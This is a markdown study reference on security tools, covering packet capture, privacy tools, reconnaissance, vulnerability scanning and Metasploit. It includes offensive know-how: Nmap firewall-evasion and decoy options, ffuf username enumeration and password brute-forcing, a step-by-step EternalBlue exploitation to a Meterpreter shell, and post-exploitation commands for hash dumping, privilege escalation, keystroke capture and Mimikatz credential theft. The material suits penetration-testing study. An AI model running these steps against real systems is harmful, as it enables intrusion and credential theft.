# Cyber-Security Tools


## Networking Tools

### Remmina

Remmina is an open-source remote desktop client, mostly used in Linux by system administrators.  
It is written in C and based on the GTK+ toolkit.  
It supports multiple network protocols, including **RDP**, **VNC** and **SSH**.  
This makes it a versatile tool for connecting to remote computers and servers.


### NetSpot

NetSpot is a software tool for wireless network assessment, scanning and survey.  
It can analyze Wi-fi coverage and performance.  
It runs on Windows and MacOS.  
It is used to analyze radio signal leaks, map channel use, optimize wireless AP locations...


### tcpdump

tcpdump is a console network packet analyzer written in C++.  
It uses the `libpcap` C++ library to capture the network packets reaching the network cards.  

The `tcpdump` command requires the root privilege to capture packets (either `sudo` or run as root).

```shell
tcpdump                                     # check that tcpdump is working (but too generic to be useful)
tcpdump -i eth0                             # listens to a specific network interface ("-i any" to use all interfaces)
tcpdump -i eth0 -w capture.pcap             # specify the packets capture file to write the packets into
tcpdump -r capture.pcap                     # read packets from a packets capture file
tcpdump -c 1234                             # limit the number of captured packets (otherwise, use Ctrl-C to stop the capture)
tcpdump -n                                  # prevent DNS lookup (show IP instead of resolved domain name)
tcpdump -nn                                 # prevent both DNS and port lookup (show port number instead of protocol name)
tcpdump -v                                  # produce more output (also -vv and -vvv for higher verbose levels)

tcpdump -q -r capture.pcap                  # quick output (timestamp + source/dest IP and port)
tcpdump -e -r capture.pcap                  # print link-level header (source/dest MAC address)
tcpdump -A -r capture.pcap                  # print the packet data in ASCII
tcpdump -xx -r capture.pcap                 # print the packet data in hexadecimal
tcpdump -X -r capture.pcap                  # print the packet header and data in hexadecimal and ASCII side-by-side
```

We can apply different filters to the captured or displayed packets to only target specific packets.  
For a complete list of available filters, refer to `man pcap-filter`.

```shell
# filter by host
tcpdump host example.com -w capture.pcap        # specific host (src or dst)
tcpdump src host example.com -w capture.pcap    # specific source host
tcpdump dst host example.com -w capture.pcap    # specific destination host

# filter by port
tcpdump port 53 -w capture.pcap                 # specific port (src or dst)
tcpdump src port 53 -w capture.pcap             # specific source port
tcpdump dst port 53 -w capture.pcap             # specific destination port

# filter by protocol
tcpdump icmp -w capture.pcap                    # specific protocol (ip, ipv6, icmp, tcp, udp...)

# filter by size
tcpdump greater 1000 -r capture.pcap            # packets bigger than 1000
tcpdump less 1000 -r capture.pcap               # packets smaller than 1000

# multiple filters
tcpdump icmp or udp -w capture.pcap             # OR logical operator
tcpdump host 1.1.1.1 and tcp -w capture.pcap    # AND logical operator
tcpdump not tcp -w capture.pcap                 # NOT logical operator
```

Some more advanced filtering allow to check some specific bytes in the header of each layer.  
We use the syntax `PROTOCOL[OFFSET:SIZE]` :
- `PROTOCOL` : protocol of the header containing the field to filter on : `arp`, `ether`, `icmp`, `ip`, `ip6`, `tcp`, and `udp`
- `OFFSET` : byte offset before the field to filter on in this header (0 for the first byte)
- `SIZE` : number of bytes to extract, default to 1

```shell
ether[0] & 1 != 0               # true if the first bit of the first byte of the Ethernet header is 1 (multicast address)
```

A built-in version of these filters is available to check TCP flags.  
`tcp[tcpflags]` gets the byte of the TCP flags, and each indidual flag is accessible with `tcp-syn`, `tcp-ack`, `tcp-fin`, `tcp-rst`, `tcp-push`.

```shell
tcpdump "tcp[tcpflags] == tcp-syn"                 # TCP packets where only the SYN flag is set
tcpdump "tcp[tcpflags] & tcp-syn != 0"             # TCP packets where at least the SYN flag is set
tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"   # TCP packets where at least the SYN or ACK flag is set
```

### WireShark

WireShark is an open-source network packet analyzer offering a GUI to capture, analyze and load network packets.  

WireShark was first released in 1998 under the name "Ethereal" and renamed to "WireShark" in 2006.  
Many people contributed to it to add support for more protocols.  
In 2023, it moved to the WireShark Foundation non-profit corporation that promotes network education and hosts SharkFest
(WireShark developer and user conferences). 

WireShark can load packets captures (PCAP) created by WireShark or other packets analyzers (like the `tcpdump` console tool).  
WireShark lists all captured or received packets, and for each packet it displays the info at each layer, and the original bytes.  
The packets can be colored (_View > Colorize Packet List_) and the coloring rules can be customized (_View > Coloring Rules_).   

We can start and stop live network sniffing with the Shark button and the red button next to it.  
We can display information about the currently loaded package, like the capture time, number of packets... (_Statistics > Capture File Properties_).

In a WireShark packets list, we can find packets by string or regex (_Edit > Find Packet_).  
It lets us choose which frame the requested search should be performed in (Packet list, Packet details or Packet bytes).

A packet can be marked for later review, by right-clicking it in the packet list.  
It will be displayed in black in the packet list, but the marking only last while the capture file is open.  
Similarly, a comment can be added to a packet, and it will stay within the captured file.

Specific packets can be exported for later analysis from the Files menu.

By default, WireShark displays the time of each packet in seconds since the beginning of the capture.  
We can modify that to display UTC date/time for example, from _View > Time Display Format_.

We can display expert info by clicking the small round icon at the bottom left of WireShark.  
It displays several warnings and errors that could require attention.

#### Filters

WireShark offers powerful filtering capabilities, both for capturing and for displaying packets.

On any cell in the packet list or value in the packet details, we can right-click and select "Apply as Filter".  
This creates a display filter and only shows the packets that have this specific value in that column.  
We can also select "Prepare as Filter" to create multiple conditions before actually applying the filter.

We can also filter the displayed packets to a single conversation between 2 machines, by right click > Conversation Filter.

Some columns can be added to the packets list by selecting a value in the packet details and right-click > Apply as Column.

WireShark shows all packets (IP-level PDU) that traverse the network.  
It allows to reconstruct the streams from these packets, to reconstruct TCP or HTTP exchanges for example.  
This can reveal some cleartext usernames and passwords for non-encrypted protocols.  
This reconstruction is performed by _right-clicking a packet > Follow Stream_.


### NetCat

NetCat is a command-line utility available on Windows and Linux to read from and write to network connections.  
It offers a backend for other machines to connect to a machine.  
It is often used to create a backdoor to access a machine remotely.

NetCat can be used in multiple ways :
- data transfer
- relay
- port scanning
- reverse shell / backdoor
- chat

```shell
# start NetCat in listening mode on port 1234
nc -l -p 1234

# from another machine, open a connection to it (for chat for example)
nc <TARGET_IP> 1234

# start NetCat as a proxy listening on port 1234 and redirecting a a target host/port
nc -l -p 1234 | nc <TARGET_HOST> <TARGET_PORT>

# use NetCat for scanning ports on a target machine
# -v is for verbose mode and -z for scanning mode (without sending data)
nc -v -z <TARGET_HOST> <START_PORT>-<END_PORT>
```

### OpenSSL

[OpenSSL](https://www.openssl.org/) is an open-source command-line tool for cryptography and secure communications.  
It is commonly used to generate private keys, create CSRs, install an SSL/TLS certificate, and identify certificate information.


### CyberDuck

[CyberDuck](https://cyberduck.io/) is a free server and cloud storage browser on Mac and Windows.  
It supports many storage technologies, including FTP, SFTP, AWS S3, MS Azure, Google Drive, OneDrive, DropBox... 


## Privacy Tools


### NordVPN / TunnelBear / CyberGhost

NordVPN, TunnelBear and CyberGhost are 3 popular VPN services that offer secure and private internet connections.

NordVPN offers strong security features and commitment to user privacy.  
TunnelBear has less features but has a more intuitive GUI that makes it a good choice for beginners.  
CyberGhost is an intermediate solution balancing a good range of features with an intuitive GUI. 


### Brave / Ghostery

**Brave** is a Chromium-based web browser focusing on privacy.  
It blocks fingerprinting, ads and ad-trackers by default.

**Ghostery** is a privacy suite offering ads and trackers blocker, a search engine and a web browser.  
It can be installed as a plugin on most popular browsers (Chrome, Firefox, Edge, Safari, Opera).


### Tor browser

Tor is a web browser transferring the incoming traffic through a network of computers to provide anonymity and untraceability.  
Requests sent to Tor go to 3 Tor relays before being sent to the target website.  
The communication is encrypted between all Tor relays.  

Files downloaded with Tor should NEVER be open while online as they can reveal the user's real IP.  

Tor is not useful to download torrents, since they tend to ignore proxy settings and make direct transfer, use a VPN instead.

Since Tor provides good anonymity, it is used by many cyber-criminals.  
Tor users can be flagged as "extremists" and "persons of interest" by the NSA, which cannot distinguish good and bad Tor users.  
Many websites (Nike, Expedia, ...) block all connections from Tor machines.  

The main attack on Tor is called the **end-to-end correlation attack**.  
It consists in monitoring the requests entering the Tor network and the requests getting out of the Tor network, and try to correlate them to deduce the user that sent the request.  
This can be made harder when using HTTPS (so the request is encrypted even before and after the Tor network) but it is 
still possible to correlate the timing between entering and exiting requests in the Tor network.

Users of Tor can access the darkweb (websites that are not referenced by search engines).  
Accessing the darkweb is legal, but a lot of the services offered on darkweb sites are illegal.  
All transactions on the darkweb are settled in bitcoin.

We can use a VPN to connect to Tor, it hides to the ISP that we access Tor, and it prevents the Tor network entry point
to see our real IP (but the VPN provider knows it).


### ProtonMail

ProtonMail is an email service provider focused on privacy and security based in Switzerland.  
The free version offers 1 address (xxx@protonmail.com) and 500Mb of storage.  
The paid version allows to use a custom domain and get rid of the ProtonMail signature.


### CCleaner and BleachBit

CCleaner and BleachBit are two cleaner programs for Windows.  
They can help to remove useless files, clear caches, remove cookies and free up disk space.



## Reconnaissance Tools


### OSINT

OSINT tools provide information from free public resources on the Internet.  
It is the main element of passive reconnaissance.  

Many OSINT resources are categorized in the OSINT framework website : [https://osintframework.com/](https://osintframework.com/)


### Nmap (Network Mapper)

Nmap is a network scanner used to discover machines on a network.  
Nmap can scan a machine for open ports and detect the version of programs running on these ports.

Nmap's default port scan sends packets to the target machines on every port, which can be intrusive.  
It may be detected by the IDS of the target, and further requests may be blocked by their firewall.  
Nmap comes with various options to customize the type of scan, with different stealth levels.

Nmap also comes with a collection of scripts used to detect vulnerabilities on the target network.

Nmap should be executed with `sudo` to allow all types of packages (not just ICMP and TCP).  

When targeting a local network, Nmap can identify the MAC address (and manufacturer) of each network card.

```shell
nmap                                 # display the help
nmap 192.168.0.1 -v                  # increase logging level of the result (-vv for even more logging)
nmap 192.168.0.1 -d                  # debugging mode (thousands of lines)

# TARGET SPECIFICATION
nmap 192.168.0.1                     # scan a machine by IP (machine discovery + port scan)
nmap scanme.nmap.org                 # scan a machine by hostname
nmap microsoft.com/24                # scan a network by domain name
nmap -iR 10                          # scan 10 random targets on the internet

# HOST DISCOVERY
nmap facebook.com/24 -sL             # List IP addresses to scan (no package sent)
nmap facebook.com/24 -sn             # Ping scan, only sending a ICMP echo request to each host to know which are up (no port scan)

nmap facebook.com/24 -Pn             # Skip host discovery (ping) and launch port scan assuming all targets are up
                                     # This is useful because -sS will skip the hosts that did not respond to ICMP during host discovery
                                     # With the -Pn option, these hosts are scanned anyway and some services may be up 
                                     # This allows service detection on hosts configured to not respond to ICMP 
nmap 192.168.1.130 -PS80             # Host discovery using TCP SYN packet to given port(s)
                                     #   -PA[portlist]    alternative using TCP ACK
                                     #   -PU[portlist]    alternative using UDP

# SCAN TECHNIQUES
nmap 192.168.1.123 -sT               # TCP Connect scan
                                     #  -> try to complete a full TCP handshake with every port to scan
                                     #  -> teardown established connections with a RST-ACK packet
                                     #  -> very slow, more detectable, but no admin right required on source machine)
nmap 192.168.1.123 -sS               # TCP SYN port scan (default)
                                     #  -> only performs the first step of the TCP handshake (SYN)
                                     #  -> reply to the SYN-ACK from the target with a RST 
nmap 192.168.1.123 -sU               # UDP port scan, to target machines that use UDP-based protocols (DNS, DHCP, NTP, SNMP...)

# PORTS TO SCAN 
nmap 192.168.0.123 -F                # limit the scan to the top 100 ports (instead of 1000 by default)
nmap 192.168.0.123 -p68-150          # limit the scan to the specified ports
nmap 192.168.0.123 -p-25             # limit the scans to ports 1 to 25 when no lower bound specified
nmap 192.168.0.123 -p-               # scans all ports (1 to 65535) when no bound specified, most time-consuming and thorough scan

# INFO GATHERING
nmap 192.168.1.123 -O                # enable OS detection
nmap 192.168.1.123 -sV               # enable service detection on each scanned port
nmap 192.168.0.123 -sC               # Script Scan, running default NSE (Nmap Script Engine) scripts for more info gathering
nmap 192.168.0.123 --script vuln     # Run a bunch of scripts to detect vulnerabilities on a target system
nmap 192.168.0.123 -A                # Aggressive scan (full port scan, OS and service detection, script scanning, traceroute)

# FIREWALL EVASION
nmap 192.168.0.123 -f                # fragment packets so firewalls don't know it comes from Nmap by the packet size
nmap 192.168.0.123 --mtu 16          # force a max packet size (multiple of 8) so firewalls don't know it comes from Nmap by the packet size
nmap 192.168.0.123 -D 192.168.0.1,192.168.0.3   # use decoys to spoof the source IP address
                                     # the scan appears to come from multiple sources (including us)
                                     # should use live decoys that do not look suspicious to the target
nmap 192.168.0.123 -g 53             # use a specific source port, should use trusted port numbers like 53 (DNS), 20 (FTP), 67 (DHCP) or 88 (Kerberos)

# FILE OUTPUT
nmap 192.168.0.123 -oN result.nmap     # save to file in normal human-readable output
nmap 192.168.0.123 -oX result.xml      # save to file in XML output
nmap 192.168.0.123 -oG result.gnmap    # save to file in greppable output (most info on one line)
nmap 192.168.0.123 -oA result          # save output to all above 3 formats
```

We can control the speed of the requests sent by Nmap, to get a result very quickly or to slowly send requests to avoid detection.  
Nmap has 6 speed levels that can be referenced either by ID or by name with the `-T` parameter :
- level 0 : `paranoid`
- level 1 : `sneaky`
- level 2 : `polite`
- level 3 : `normal`
- level 4 : `aggressive`
- level 5 : `insane`

```shell
nmap 192.168.0.123 -sS -F -T2               # level 2
nmap 192.168.0.123 -sS -F -T aggressive     # level 4

nmap 192.168.0.123 --min-rate 10 -F         # min number of packets per second
nmap 192.168.0.123 --max-rate 10 -F         # max number of packets per second
nmap 192.168.0.123 --host-timeout 100 -F    # specify the max time we can wait for a host to respond
```

### Recon-ng

Recon-ng is a terminal reconnaissance tool shipped with Kali Linux.  
It is similar to Maltego, but offering a custom DSL in the terminal instead of a GUI.

```shell
recon-ng                          # start the Recon-ng DSL
help                              # show all available commands of the DSL
back                              # quit the loaded module or workspace, or exit Recon-ng
exit                              # quit Recon-ng

marketplace install all           # install all available modules
workspaces list                   # show all workspaces
workspaces create google          # create a workspace called "google" for a reconnaissance on google.com
workspaces load google            # enter inside the "google" workspace
show                              # list all available item types (company, email, ...) in the loaded workspace
show companies                    # list all companies registered in the workspace
show contacts                     # list all contacts registered in the workspace
db insert companies               # insert a new company item in the workspace (prompt for company details)
db insert domains                 # insert a new domain name in the workspace (prompt for domain details)

marketplace search whois          # search all existing modules for "whois"
modules load recon/domains-contacts/whois-pocs     # load a module listed by the above command
info                              # show how to use the currently loaded module
options set SOURCE google.com     # set the SOURCE option of the module to "google.com"
run                               # find the point of contact (poc) of the SOURCE domain and add it to the contacts table

marketplace search brute
modules load recon/domains-hosts/brute_hosts       # load a module listed by the above command
info                              # show how to use the currently loaded module
run                               # try to check subdomain existence using a brute-force from a text file

marketplace search interesting
module load discovery/info_disclosure/interesting_files
info                              # show how to use the currently loaded module
run

marketplace search reporting
modules load reporting/html       # load a module to report all findings of the workspace
info
options set CREATOR Bob
options set CUSTOMER Google
run
```


### scanless

scanless is a utility to create an exploitation web server that can perform open port scans in a stealthier manner.  
If the target notices the scan, it appears as being performed by this web server instead of the actual host.


### dnsenum

dnsenum is a DNS reconnaissance tool.  
It is used to enumerate all DNS servers and DNS entries for a given organization.


### The Harvester

The harvester is a Python script used by red teams during penetration tests to perform OSINT reconnaissance.  
It can gather emails, subdomains, hosts, employee names, open ports, IPs...  
It retrieves its information from public sources, like search engines, PGP key servers, the Shodan database...


### ICANN Lookup

ICANN Lookup is a website giving public info on registered domain names.  
This info can be hidden by the domain name registrar (like GoDaddy) when requested.  


### Holehe

Holehe is a Python script testing the registration of an email address against over 120 services (Amazon, GitHub...).  
The target email address is not alerted (no mail sent to the address to reset a password for example).  

It is a useful tool for **OSINT** (Open-Source INTelligence) to gather information on people.  
It can be integrated with Maltego for automatic social networks reconnaissance in GUI.


### Shodan Database

The Shodan database is a search engine use to search for various types of devices (webcam, router, server)...


### The WayBack Machine

The WayBack Machine is a website that takes snapshot of websites and allows to see a website as it used to be in the past.  
This can be used to see the content of previous versions of websites.



## Vulnerability Scanning Tools


### Nessus

Nessus is a commercial vulnerability scanning tool.  
It identifies vulnerabilities on a network, classifies them and assigns a severity to each of them.  
It also keeps track of past vulnerabilities and reports.

Nessus lets us create **scan policies**, that are definitions to describe the vulnerability tests to run.  
We can provide some credentials to a Nessus policy to perform a credentials scan (and detect vulnerabilities when logged in).  
Nessus offers many **plugins** that are all potential vulnerabilities to check for.  

To start a scan, we must specify which scan policy to apply, and the targets of the scan.  
Once completed, the scan generates a report of all detected vulnerabilities for each target server.  
It provides details on each vulnerability, like the description, the severity, the CWE, the tools that can exploit it...


### sn1per

sn1per is an automated scanner used during a penetration test to enumerate and scan vulnerabilities on the network.  
It combines in a single tools several reconnaissance and exploit tools (Nmap, Metasploit, theHarvester...).  
It is an alternative to Nessus.


### Burp Suite

The Burp suite is a Java-based web application security testing software.  
It is the industry standard tool for web application and mobile application penetration testing.  
Burp is installed by default in Kali Linux, and can be downloaded and installed on other OS from the PortSwigger website.

Burp acts as a web proxy : it captures and enables manipulation of HTTP/HTTPS traffic between a browser and a web server.  
It analyzes the traffic, sends its own requests to the web server, and reports all found security vulnerabilities.

The Burp suite comes in 3 editions : 
- **Burp Suite Community** : free for non-commercial use, include the Burp proxy, requests history and main Burp functionalities
- **Burp Suite Professional** : free trial, add an automated vulnerability scanner, a fuzzer with no rate limit, project save, access to Burp extensions...
- **Burp Suite Enterprise** : mostly used for continuous scanning, installed on a server and constantly scans the target web application for potential vulnerabilities

The main features of Burp are separated into different modules, represented as top-level tabs in the Burp GUI :
- **proxy** : enable interception and modification of requests and responses between a browser and a web application
- **repeater** : enable the capture, modification and resending of the same request several times (used for trial and error when crafting a payload)
- **intruder** : spray endpoints with requests (used for brute-force or fuzzing)
- **decoder** : decode captured info or encode payloads before sending them to the target
- **comparer** : compare 2 pieces of data (either at word or byte level)
- **sequencer** : check the randomness of tokens (like session cookies) to try to infer a pattern

The Burp suite can easily be extended with custom extensions written in Java, Python or Ruby.  
The **Burp Suite Extender** module allows to load existing extensions.

The PortSwigger website offers extensive trainings and details about Burp.

The Settings button at the right of the GUI allows to configure Burp.   
Settings are split into **user settings** (persisted) and **project settings** (non-persisted).

#### Burp Proxy

The Proxy tab in the Burp dashboard allows to intercept requests sent from a browser to a website.  
Once the browser is configured to use the Burp proxy, any HTTP request sent from that browser gets intercepted by the Burp proxy.

Burp ships with a built-in Chromium browser that is already configured to use the Burp proxy.  

We can also use our own browser, but it needs to be manually configured to use the Burp proxy.  
For example, we can use the **FoxyProxy** Firefox extension and configure a proxy to `127.0.0.1:8080` (see Burp Proxy settings to know the port).  

For HTTPS to be allowed, we need the browser to trust the Burp certificate issued by PortSwigger CA.  
We can manually add the PortSwigger CA certificate in the trusted certificate :
- activate the Burp proxy
- access `http://burp/cert` to download the PortSwigger CA certificate
- access `about:preference` in Firefox URL > Privacy & Security > Certificates > View Certificates > Import

Each request reaching the proxy is captured in the Intercept tab of the proxy, where it can be viewed, modified and forwarded or dropped.  
All requests received by Burp are visible in the HTTP History tab of the proxy.  
On right-click, requests can be sent to other modules (Intruder, Repeater, Sequencer, Comparer...).

In the Intercept tab, we can toggle to interception, so traffic is either forwarded automatically or blocked in the proxy.  
Even when the proxy does not intercept traffic, it still keeps it in history.

#### Target

In the _Site Map_ tab, the target module builds a map of each accessed website as Burp sees the web traffic.  
It does not require the proxy to be intercepting the traffic.  

In the _Scope_ tab, we can include or exclude specific IPs or domains, to avoid capturing unnecessary traffic.  
Requests that are not in the scope will not appear in any Burp tools (Proxy, target, ...).

In the _Issue Definitions_ tab, Burp lists all the possible issues that its scanner can detect.  
The issue detection is only available in the Professional edition, but the extensive list of potential issues can be seen in the Community edition as well.



### ffuf - Fuzz Faster U Fool

fuff is a fast web fuzzer written in Go.  
It accepts a list of words, and sends many requests to a web server replacing a placeholder by the words in the list.  
It can detect which requests were successful and which were not and report its findings.  
This is used for discovery of hidden files or pages in a website.

Some good word lists are publicly available :
- [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- [https://github.com/six2dez/OneListForAll](https://github.com/six2dez/OneListForAll) 

```shell
# simple example with a FUZZ placeholder in the URL
ffuf -w wordlist.txt -u 'https://ffuf.io.fi/FUZZ'

# same but with a custom placeholder name
ffuf -w wordlist.txt:FOO -u 'https://ffuf.io.fi/FOO'

# multiple word lists
# by default it tries every combination of words (n*m combinations)
# use "-mode pitchwork" to use the 1st word of each list, then the 2nd of each list... (n combinations)
ffuf -w wordlist1.txt:FOO -w wordlist2.txt:BAR -u 'https://ffuf.io.fi/FOO/BAR'

# list all valid usernames in a website among a list of usernames
# we use the POST method (GET by default)
# we provide the POST body with -d parameter, as url-encoded, so we add the corresponding header
# -mr lets us match the positive results on a regex (by default it matches on non-error response codes)
ffuf -w SecLists/Usernames/Names/names.txt
     -X POST
     -d "username=FUZZ&email=x&password=x&cpassword=x" 
     -H "Content-Type: application/x-www-form-urlencoded"
     -u http://10.10.1.80/customers/signup
     -mr "user already exists"

# brute-force password by using a list of valid usernames and a list of potential passwords
# use -fc 200 to filter out the 200 status code (considered as failed)
ffuf -w valid_usernames.txt:W1
     -w SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
     -X POST
     -d "username=W1&password=W2" 
     -H "Content-Type: application/x-www-form-urlencoded"
     -u http://10.10.1.80/customers/login
     -fc 200
```


## Exploiting Tools


### Metasploit

Metasploit (or MSF for Metasploit Framework) is a command-line security tool improving penetration testing.  
It is a set of tools for information gathering, exploitation, exploit development, post-exploitation...

If a vulnerability was discovered (with Nessus or sn1per for example), we can check if Metasploit has an exploit for it.  
If it does, we can execute the exploit, and Metasploit can provide a command shell on this victim machine.  

It is a script-kiddie friendly framework to attack machines without understanding the actual vulnerabilities.  
It also offers more advanced capabilities, like the creation of custom plugins to exploit new vulnerabilities.

The `msfconsole` command starts the Metasploit console, through which we can interact with all Metasploit modules.  
Modules are components of the Metasploit framework built to perform a specific task (vulnerability exploit, target scan, brute-force attack...).   

Modules are the core of Metasploit and are organized in a hierarchy :
- **auxiliary** : all supporting modules, like scanners, crawlers, fuzzers...
- **encoders** : encode the exploit and payload to obfuscate their content, making them harder to detect
- **evasion** : implement advanced techniques to avoid detection by antivirus
- **exploits** : module exploiting known vulnerabilities, classified by system
- **NOPS** : No-Operation, modules doing nothing used for padding to achieve consistent payload sizes
- **payloads** : code that run on the target system once the exploit has been executed
- **post** : post-exploit operation, for reconnaissance, lateral movement, privilege escalation, cleanup...

Many Shell commands can also be run in the Metasploit console : `ls`, `cd`, `top`, `ping`, `nmap`, `clear`, `history` ...

We use the `use <MODULE>` command to load a module, which creates a local context to define variables.  
Each module defines a set of variables that can be optional or mandatory, and can have or not a default value.  
These variables can be displayed with the `show options` command when the module is loaded.  
Some common variables used by various modules are :
- `RHOSTS` (remote hosts) : target IP, IP range, network address (CIDR notation) or file containing targets
- `RPORT` (remote port) : port on the target system
- `PAYLOAD` : payload to use in the exploit
- `LHOST` (local host) : the attacking machine address
- `LPORT` (local port) : the port on the attacking machine
- `SESSION` : session ID created by Metasploit after a successful connection to a target system, used by post-exploitation modules

Modules usually come with a default payload, the action that is performed once the exploit gave access to the target.  
The default payload is usually `reverse_tcp` that opens a shell (Meterpreter, bash or cmd) on the target machine.  
We can see other available payloads, including different types of reverse shells, with `show payloads`, and set one with `set payload PAYLOAD_ID` 

The prompt allows us to distinguish among the possible shells in Metasploit :
- normal shell out of Metasploit
- top-level Metasploit shell
- shell with the context of a loaded module
- Meterpreter shell : Metasploit payload offering a shell on the target system
- target system shell : we may have a common cmd or bash shell on the target system

```shell
# list all types of objects we can list with the show command
help show

# show global options, or module-level options if a module is loaded
show options

# list all exploit modules in Metasploit
show exploits

# search available modules for a keyword, target system or CVE number
search eternalblue  

# display the documentation about module 0 returned in the previous search
info 0

# Load a module for use (EternalBlue exploit targeting SMBv1, leaked in Apr17 and used in WannaCry in May17)
use exploit/windows/smb/ms17_010_eternalblue 

# show payload modules that can be used with the loaded exploit
show payloads

# set a payload to use instead of the default one (using the ID in the "show payloads" output)
set payload 2

# set or unset a variable listed in "show options" for the loaded module
set RHOSTS 10.10.166.19
unset RHOSTS

# set or unset a global variable that will be used for all modules
setg RHOSTS 10.10.166.19
unsetg RHOSTS

# run the exploit (-z to background the session when opened)
exploit
run             #  alias for "exploit"

# move the currently open session to the background and move back to the msfconsole prompt (Ctrl-Z does the same)
background

# exit the context and go back to the top-level Metasploit console
back

# list the existing sessions
sessions

# re-attach a session in the background, using its ID listed with "sessions"
sessions -i 1
```

#### Exploit Example

To check if a target machine is vulnerable to EternalBlue and exploit it to get a Meterpreter shell :
```shell
msfconsole                                     # enter the Metasploit console
setg RHOSTS <TARGET_IP>                        # set the target IP as a global variable
search eternalblue                             # look for modules about EternalBlue
use auxiliary/scanner/smb/smb_ms17_010         # load the scanner (same as "use 3" referencing the search result)
exploit                                        # run the scanner and confirm that the target is vulnerable to EternalBlue
use exploit/windows/smb/ms17_010_eternalblue   # load the EternalBlue exploit module
exploit                                        # run the exploit and obtain a Meterpreter shell on the target
background                                     # put the Meterpreter shell in the background
sessions                                       # see the Meterpreter shell in the background (usable for post-exploit)     
```

#### Useful modules

- `auxiliary/scanner/portscan/tcp` : scan for open TCP ports (similar to Nmap)
- `auxiliary/scanner/smtp/smtp_relay` : detect if an SMTP server allows open relay
- `scanner/discovery/udp_sweep` : scan for open UDP ports
- `scanner/smb/smb_enumshares` : enumerate the shares provided by the SMB service
- `scanner/smb/smb_enumusers` : enumerate the SMB users
- `scanner/smb/smb_login` : crack an SMB user password from a wordlist (we can then use `smbclient` to access a SMB share)
- `exploit/multi/fileformat/office_word_macro` : create a MS Word document containing a macro executing a payload when opened
- `exploit/windows/local/tokenmagic` : UAC bypass to elevate privileges of an existing session to SYSTEM
- `exploit/windows/smb/ms17_010_eternalblue` : open a Meterpreter shell on a machine vulnerable to EternalBlue
- `exploit/windows/smb/psexec` : open a Meterpreter (or any other payload) from a machine using SMB username/password
- `post/linux/gather/hashdump` : post-exploit module to list user password hashes on a Linux target
- `post/multi/manage/shell_to_meterpreter` : convert a shell to a Meterpreter shell
- `post/multi/recon/local_exploit_suggester` : analyze the target system to suggest potential exploits
- `post/windows/gather/enum_shares` : enumerate SMB shares
- `post/windows/manage/enable_rdp` : enable RDP so we can remote desktop to the target machine as a compromised user

#### Metasploit Database

Metasploit can use a database to keep track of the multiple on-going projects.  
It uses PostgreSQL, and can be started and initialized with :
```shell
systemctl start postgresql
msfdb init
```

After the database is created, we can interact with it from inside the Metasploit console.  
The DB status can be checked with the `db_status` command, and all database-related commands are shown with `help`.  
For example `db_nmap` is a `nmap` variant that saves its results in the DB, viewable with the `hosts` and `services` commands.

We can create workspaces to isolate different projects (by default, we are in the `default` workspace).
```
workspace                     # list workspaces and show active one
workspace -a workspaceA       # create a new workspace and set it as active
workspace workspaceA          # set a workspace as active
workspace -d workspaceA       # delete a workspace
```

#### Meterpreter

Meterpreter is a Metasploit payload that creates a specialized shell supporting penetration testing.  
It runs on the target system, often on a reverse shell controlled from within the Metasploit console.

Meterpreter runs in RAM memory as a process and does not write any file on disk in the target system, in order to avoid detection.  
Its communication with the local machine is encrypted with TLS, so IDS will only detect it if they decrypt traffic.  
However, Meterpreter can still be recognized by most major antivirus software.  

We can list the different flavors of Meterpreter in MsfVenom with the `msfvenom -l payloads | grep meterpreter` command.  
We can see that it has different versions depending on the OS of the target machine (Android, iOS, Linux, OSX, Windows).  
It also has versions that depend on a technology being available on the target machine (Java, PHP, Python).  

Meterpreter payloads exist in **inline** (also called **single**) or **staged** form.  
An inline payload contains the entire payload in its binary.  
A staged payload is smaller and contains only a stager, that downloads the rest from the attacker machine when executed.  
Inline payloads use the `_` symbol, for example `python/meterpreter_reverse_tcp` is inline and `python/meterpreter/reverse_tcp` is its staged equivalent.  

Exploits in Metasploit only support a subset of payloads, that can be listed with `show payloads` when the exploit module is loaded.

Meterpreter exposes its own set of specialized commands to interact with the target machine.  
These can vary from a version of Meterpreter to the other, so check avaliable commands listed in the `help` command. 

```shell
help                             # show available Meterpreter commands

# basic shell commands
ls
cd <FOLDER>
pwd
cat "<FILE_PATH>"                     # display the content of a file
ps                                    # list running processes
edit <FILE_PATH>                      # edit a file
rm <FILE_PATH>                        # delete a file
upload <LOCAL_PATH> <REMOTE_PATH>     # transfer a file from the attacker's machine to the target machine
download <REMOTE_PATH> <LOCAL_PATH>   # transfer a file from the target machine to the attacker's machine

# Meterpreter specialized commands
getpid                           # get the process ID of the Meterpreter process
getuid                           # get the user that Meterpreter runs as
guid                             # get session GUID
sysinfo                          # show info about the target machine (including OS)
getprivs                         # enable and list all privileges available to the current user
search *.txt                     # look for specific files on the target host
hashdump                         # dump the content of the SAM database (user password's hashes)
getsystem                        # try to elevate privilege to system
migrate <PID>                    # migrate Meterpreter to another process on the target machine
load <METERPRETER_EXTENSION>     # load an extension : python, kiwi (updated version of mimikatz) to add new commands in Meterpreter
  
# networking
arp                              # display the target machine's ARP cache
ifconfig                         # network interfaces on the target machine
netstat                          # network connections on the target machine
route                            # view and modify the route table on the target machine

# post-exploit modules
info <POST_MODULE>               # show info about a post-exploit module
run  <POST_MODULE>               # run the post-exploit module 

shell                            # start a regular shell on the target machine (ctrl-Z to go back to Meterpreter)
background                       # send this Meterpreter shell to the background (use "sessions" to see it)
exit                             # close this Meterpreter shell
```

It can contain many other commands, like commands to control the webcam, capture keystrokes, take a screenshot, shutdown/reboot the target machine...

Migrating Meterpreter to an existing process helps Meterpreter interact with it.  
For example, we can migrate to the PID of a word-processing process (Word, Notepad...), and then capture its key strokes.  
Note that when migrating to a process, we get the privileges of the user who started the process, and we may not be able to get back to the original privileges.  
On Windows machine, the printer service `spoolsv.exe` is a good candidate to migrate to, because it runs as SYSTEM user and restarts on crash.

Meterpreter extensions can be loaded to enrich the capabilities of the Meterpreter shell with additional commands.  
For example, the `kiwi` extension (recent version of Mimikatz) adds commands to obtain various passwords and password hashes from the target machine.  
It can also create a golden Kerberos ticket to get access with any user to any component of the system.


#### MsfVenom

MsfVenom is a tool to create custom payloads, replacing deprecated tools MsfPayload and MsfEncode since 2015.  
It has access to all payloads in Metasploit and can craft payloads in several formats (PHP, exe, dll, elf, jar ...) 
for different target systems (windows, linux, apple, android...).

```shell
msfvenom                                  # display the help
msfvenom -l payloads                      # list all payload modules (can also list encoders, nops, formats...)
